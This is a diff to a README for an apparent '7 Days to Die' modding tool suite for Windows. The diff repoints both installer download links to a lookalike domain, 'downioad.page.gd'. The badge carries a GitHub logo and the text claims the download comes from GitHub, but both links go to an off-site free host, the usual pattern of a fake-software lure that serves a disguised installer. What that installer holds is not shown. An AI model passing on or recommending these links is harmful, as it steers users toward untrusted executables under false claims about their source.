@@ -2,7 +2,7 @@
 
 Welcome to the 7 Days to Die Modding Tool Suite, your comprehensive desktop solution designed to revolutionize how you play and manage 7 Days to Die on Windows. This powerful tool offers an array of features for mod management, performance tuning, and server configuration, ensuring a seamless and enhanced gaming experience. Whether you're looking to install popular mods, optimize your system for better performance, or set up a multiplayer server, this tool has you covered with its intuitive interface and robust functionality.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -60,7 +60,7 @@ A: Currently, the tool is designed exclusively for Windows desktop systems. We h
 
 Ready to enhance your 7 Days to Die experience? Download the latest version of the Modding Tool Suite from GitHub.
 
-[Get the latest release here](https://download-page.page.gd/)
+[Get the latest release here](https://downioad.page.gd/)
 
 ---  
 *Version 2.0 | Last Updated: November 2026*  
